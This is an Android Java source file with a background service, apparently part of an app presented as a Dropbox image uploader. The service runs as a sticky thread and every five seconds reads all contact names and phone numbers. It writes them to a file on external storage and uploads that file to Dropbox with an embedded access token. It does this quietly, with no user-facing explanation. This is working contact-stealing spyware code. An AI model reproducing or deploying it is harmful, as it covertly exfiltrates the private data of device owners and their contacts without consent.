package com.example.imageuploaddropbox;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.DateFormat;
import java.util.Date;

public class mine_service extends Service {



//    class DBThread extends Thread
//    {
//        //Upload c_up;
//        DBThread()
//        {
//            //this.txt = TEXT1;
//        }
//
//        @Override
//        public void run()
//        {
//
//            while (true)
//            {
//
//                if (Thread.interrupted())
//                {
//                    stopSelf();
//
//                    // We've been interrupted: no more crunching.
//                    return;
//                }
//
//                getContactList();
//                uploadFile(uri_string);
//                try {
//                    sleep(5000);
//                    //sleep(10000);
//
//                } catch (InterruptedException e) {
//                    // this part is executed when an exception (in this example InterruptedException) occurs
//                }
//                //Toast.makeText(MyService.this, "Thread awakes...",Toast.LENGTH_SHORT).show();
//            }
//        }
//    }
//
//    DBThread up=null;

    MyRunnable myRunnable = new MyRunnable();


    public class MyRunnable implements Runnable
    {

        private boolean doStop = false;

        public synchronized void doStop() {
            this.doStop = true;
        }

        private synchronized boolean keepRunning() {
            return this.doStop == false;
        }

        @Override
        public void run() {
            while(keepRunning())
            {
                // keep doing what this thread should do.
                System.out.println("Running");
                getContactList();
                uploadFile(uri_string);
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

            }
        }
    }




























    private String ACCESS_TOKEN = "EnterYourTokenHere";
    public static String TEXT1 = "";
    final String FILENAME = "file";

    final String DIR_SD = "MyFiles";
    final String FILENAME_SD = "Contacts.txt";

    String uri_string;
    String mPath;


    final String LOG_TAG = "myLogs";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(LOG_TAG, "onCreate");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        Log.d(LOG_TAG, "onStartCommand");
        DropboxClientFactory.init(ACCESS_TOKEN);
       // MyRunnable myRunnable = new MyRunnable();

        Thread thread = new Thread(myRunnable);

        thread.start();
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        try
        {
            stopSelf();
            myRunnable.doStop();

        } catch (Exception e)
        {
            e.printStackTrace();
            stopSelf();
        }
    }
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        Log.d(LOG_TAG, "onBind");
        return null;
    }









    private void uploadFile(String uri_string) {
        new UploadFileTask(this, DropboxClientFactory.getClient(), new UploadFileTask.Callback() {
            @Override
            public void onUploadComplete(FileMetadata result) {
                Log.e("Complete", "onUploadComplete: " + result.toString() );
                String message = result.getName() + " size " + result.getSize() + " modified " +
                        DateFormat.getDateTimeInstance().format(result.getClientModified());
                Toast.makeText(getApplicationContext(), message, Toast.LENGTH_SHORT)
                        .show();


                Toast.makeText(getApplicationContext(), "Successfully Uploaded.", Toast.LENGTH_SHORT)
                        .show();

                /*Intent i = new Intent(getApplicationContext() , GetImageActivity.class);
                    i.putExtra("path_lower" , result.getPathLower());
                    startActivity(i);*/
            }

            @Override
            public void onError(Exception e) {

                Log.e("ERROR ", "Failed to upload file.", e);

            }
        }).execute(uri_string, mPath);
    }







    public void getContactList() {
        TEXT1 = "";
        //requestPermissions(new String[] {Manifest.permission.READ_CONTACTS}, PERM_REQUEST);

        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        Log.i("Srv", "Name: " + name);
                        TEXT1 += "Name:" + name + ";";
                        Log.i("Srv", "Phone Number: " + phoneNo);
                        TEXT1 += "Number:"+ phoneNo + "\n";
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }
        //return TEXT;
        String currentDateTimeString = DateFormat.getDateTimeInstance().format(new Date());
        TEXT1 += "\n" + currentDateTimeString;
        writeFileSD();
    }

    void writeFileSD() {
        // проверяем доступность SD
        if (!Environment.getExternalStorageState().equals(
                Environment.MEDIA_MOUNTED)) {
            Log.d(LOG_TAG, "SD-карта не доступна: " + Environment.getExternalStorageState());
            return;
        }
        // получаем путь к SD
        File sdPath = Environment.getExternalStorageDirectory();
        // добавляем свой каталог к пути
        sdPath = new File(sdPath.getAbsolutePath() + "/" + DIR_SD);
        // создаем каталог
        sdPath.mkdirs();
        // формируем объект File, который содержит путь к файлу
        File sdFile = new File(sdPath, FILENAME_SD);
        try {
            // открываем поток для записи
            BufferedWriter bw = new BufferedWriter(new FileWriter(sdFile));
            // пишем данные
            bw.write(TEXT1);
            // закрываем поток
            bw.close();
            Log.d(LOG_TAG, "Файл записан на SD: " + sdFile.getAbsolutePath());
        } catch (IOException e) {
            e.printStackTrace();
        }
        uri_string=sdPath.toString();
        mPath=sdFile.toString();
    }
}





